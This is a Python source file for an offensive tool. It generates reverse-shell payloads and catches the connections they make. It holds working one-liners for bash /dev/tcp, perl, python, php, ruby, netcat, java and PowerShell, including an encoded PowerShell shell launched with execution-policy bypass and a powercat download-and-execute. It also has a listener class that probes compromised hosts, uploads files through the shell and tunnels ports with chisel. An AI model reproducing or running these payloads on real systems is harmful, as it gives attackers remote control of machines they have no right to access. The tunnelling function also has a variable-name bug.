#!/usr/bin/python

import socket
import os
import sys
import pty
import util
import time
import random
import threading
import paramiko
import readline
import base64

class ShellListener:

    def __init__(self, addr, port):
        self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bind_addr = addr
        self.port = port
        self.verbose = False
        self.on_message = []
        self.listen_thread = None
        self.connection = None
        self.on_connect = None
        self.features = set()

    def startBackground(self):
        self.listen_thread = threading.Thread(target=self.start)
        self.listen_thread.start()
        return self.listen_thread

    def has_feature(self, feature):
        return feature.lower() in self.features

    def probe_features(self):
        features = ["wget", "curl", "nc", "sudo", "telnet", "docker", "python"]
        for feature in features:
            output = self.exec_sync("whereis " + feature)
            if output.startswith(feature.encode() + b": ") and len(output) >= len(feature)+2:
                self.features.add(feature.lower())
            
    def get_features(self):
        return self.features

    def start(self):
        self.running = True
        self.listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listen_socket.bind((self.bind_addr, self.port))
        self.listen_socket.listen()
        while self.running:
            self.connection, addr = self.listen_socket.accept()
            with self.connection:
                print("[+] Got connection:", addr)

                if self.on_connect:
                    self.on_connect(addr)

                while self.running:
                    data = self.connection.recv(1024)
                    if not data:
                        break
                    if self.verbose:
                        print("< ", data)
                    for callback in self.on_message:
                        callback(data)
                        
            print("[-] Disconnected")
            self.connection = None

    def close(self):
        self.running = False
        self.sendline("exit")
        self.listen_socket.close()

    def send(self, data):
        if self.connection:
            if isinstance(data, str):
                data = data.encode()

            if self.verbose:
                print("> ", data)

            self.connection.sendall(data)

    def sendline(self, data):
        if isinstance(data, str):
            data = data.encode()
        data += b"\n"
        return self.send(data)

    def exec_sync(self, cmd):
        output = b""
        complete = False

        if isinstance(cmd, str):
            cmd = cmd.encode()

        def callback(data):
            nonlocal output
            nonlocal complete

            if complete:
                return

            output += data
            if data.endswith(b"# ") or data.endswith(b"$ "):
                complete = True
                if b"\n" in output:
                    output = output[0:output.rindex(b"\n")]
                if output.startswith(cmd + b"\n"):
                    output = output[len(cmd)+1:]
        
        self.on_message.append(callback)
        self.sendline(cmd)
        while not complete:
            time.sleep(0.1)
        
        self.on_message.remove(callback)
        return output

    def print_message(self, data):
        sys.stdout.write(data.decode())
        sys.stdout.flush()

    def interactive(self):
        self.on_message.append(lambda x: self.print_message(x))
        while self.running and self.connection is not None:
            self.sendline(input())

    def wait(self):
        while self.running and self.connection is None:
            time.sleep(0.1)
        return self.running

    def write_file(self, path, data_or_fd, permissions=None):

        def write_chunk(chunk, first=False):
            # assume this is unix
            chunk = base64.b64encode(chunk).decode()
            operator = ">" if first else ">>"
            self.sendline(f"echo {chunk}|base64 -d {operator} {path}")

        chunk_size = 1024
        if hasattr(data_or_fd, "read"):
            first = True
            while True:
                data = data_or_fd.read(chunk_size)
                if not data:
                    break
                if isinstance(data, str):
                    data = data.encode()
                write_chunk(data, first)
                first = False
            data_or_fd.close()
        else:
            if isinstance(data_or_fd, str):
                data_or_fd = data_or_fd.encode()
            for offset in range(0, len(data_or_fd), chunk_size):
                write_chunk(data_or_fd[offset:chunk_size], offset == 0)

        if permissions:
            self.sendline(f"chmod {permissions} {path}")

def generate_payload(type, local_address, port, index=None):

    commands = []

    if type == "bash":
        commands.append(f"bash -i >& /dev/tcp/{local_address}/{port} 0>&1")
    elif type == "perl":
        commands.append(f"perl -e 'use Socket;$i=\"{local_address}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'")
        commands.append(f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{local_address}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")
    elif type == "python" or type == "python2" or type == "python3":
        binary = type
        commands.append(f"{binary} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_address}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'")
    elif type == "php":
        commands.append(f"php -r '$sock=fsockopen(\"{local_address}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'")
    elif type == "ruby":
        commands.append(f"ruby -rsocket -e'f=TCPSocket.open(\"{local_address}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'")
    elif type == "netcat" or type == "nc":
        commands.append(f"nc -e /bin/bash {local_address} {port}")
        commands.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {local_address} {port} >/tmp/f")
    elif type == "java":
        commands.append(f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{local_address}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()")
    elif type == "xterm":
        commands.append(f"xterm -display {local_address}:1")
    elif type == "powercat":
        return "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://%s/powercat.ps1');powercat -c %s -p %d -e cmd\"" % (local_address, local_address, port)
    elif type == "powershell":
        payload = '$a=New-Object System.Net.Sockets.TCPClient("%s",%d);$d=$a.GetStream();[byte[]]$k=0..65535|%%{0};while(($i=$d.Read($k,0,$k.Length)) -ne 0){;$o=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($k,0,$i);$q=(iex $o 2>&1|Out-String);$c=$q+"$ ";$b=([text.encoding]::ASCII).GetBytes($c);$d.Write($b,0,$b.Length);$d.Flush()};$a.Close();' % (local_address, port)
        payload_encoded = base64.b64encode(payload.encode("UTF-16LE")).decode()
        return f"powershell.exe -exec bypass -enc {payload_encoded}"
    else:
        return None

    if index is None or index < 0 or index >= len(commands):
        return "\n".join(commands)
    else:
        return commands[index]

def spawn_listener(port):
    pty.spawn(["nc", "-lvvp", str(port)])

def trigger_shell(func, port):
    def _wait_and_exec():
        time.sleep(1.5)
        func()

    threading.Thread(target=_wait_and_exec).start()
    spawn_listener(port)

def trigger_background_shell(func, port):   
    listener = ShellListener("0.0.0.0", port)
    listener.startBackground()
    threading.Thread(target=func).start()
    while listener.connection is None:
        time.sleep(0.5)
    return listener

def create_tunnel(shell, ports: list):
    if len(ports) == 0:
        print("[-] Need at least one port to tunnel")
        return
    
    # TODO: ports

    if isinstance(shell, ShellListener):
        # TODO: if chisel has not been transmitted yet
        # we need a exec sync function, but this requires guessing when the output ended or we need to know the shell prompt
        ipAddress = util.get_address()
        chiselPort = 3000
        chisel_path = os.path.join(os.path.dirname(__file__), "chisel64")
        shell.write_file("/tmp/chisel64", open(chisel_path, "rb"))
        shell.sendline("chmod +x /tmp/chisel64")

        t = threading.Thread(target=os.system, args=(f"{chisel_path} server --port {chisel_port} --reverse", ))
        t.start()

        shell.sendline(f"/tmp/chisel64 client --max-retry-count 1 {ipAddress}:{chiselPort} {ports} 2>&1 >/dev/null &")
    elif isinstance(shell, paramiko.SSHClient):
        # TODO: https://github.com/paramiko/paramiko/blob/88f35a537428e430f7f26eee8026715e357b55d6/demos/forward.py#L103
        pass

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: %s <type> [port]" % sys.argv[0])
        exit(1)

    listen_port = None if len(sys.argv) < 3 else int(sys.argv[2])
    payload_type = sys.argv[1].lower()

    local_address = util.get_address()

    # choose random port
    if listen_port is None:
        listen_port = random.randint(10000,65535)
        while util.isPortInUse(listen_port):
            listen_port = random.randint(10000,65535)

    payload = generate_payload(payload_type, local_address, listen_port)

    if payload is None:
        print("Unknown payload type: %s" % payload_type)
        print("Supported types: bash, perl, python[2|3], php, ruby, netcat|nc, java, xterm, powershell")
        exit(1)

    tty = "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    print("---PAYLOAD---\n%s\n---TTY---\n%s\n---------\n" % (payload, tty))

    if payload_type == "xterm":
        print("You need to run the following commands (not tested):")
        print("xhost +targetip")
        print("Xnest :1")
    else:
        pty.spawn(["nc", "-lvvp", str(listen_port)])
